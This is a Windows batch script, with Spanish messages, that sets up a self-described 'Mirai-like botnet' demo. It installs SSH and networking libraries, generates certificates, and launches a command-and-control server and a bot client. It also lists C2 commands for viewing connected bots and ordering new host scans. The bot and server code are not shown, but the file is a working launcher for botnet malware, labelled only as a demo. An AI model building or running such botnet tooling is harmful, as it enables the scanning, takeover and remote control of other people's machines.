@echo off
REM filepath: c:\Users\Rubir\Downloads\mirai\start_demo.bat
echo ========================================
echo   MIRAI-LIKE BOTNET - DEMO SETUP
echo ========================================
echo.

echo [1/4] Instalando dependencias...
python -m pip install --quiet paramiko netaddr cryptography
if %ERRORLEVEL% NEQ 0 (
    echo [!] Error instalando dependencias
    pause
    exit /b 1
)

echo [2/4] Generando certificados SSL...
python generate_certs.py
if %ERRORLEVEL% NEQ 0 (
    echo [!] Error generando certificados
    pause
    exit /b 1
)

echo [3/4] Iniciando servidor C2...
start "C2 Commander" python c2_commander.py

timeout /t 3 /nobreak >nul

echo [4/4] Iniciando bot de prueba...
start "Bot Soldier" python bot_soldier.py

echo.
echo [+] Sistema iniciado!
echo [*] Ventana C2: Interfaz de control
echo [*] Ventana Bot: Bot conectandose
echo.
echo Comandos disponibles en C2:
echo   - status: Ver bots conectados
echo   - list 1: Ver hosts encontrados
echo   - recon 1: Ordenar nuevo escaneo
echo.
pause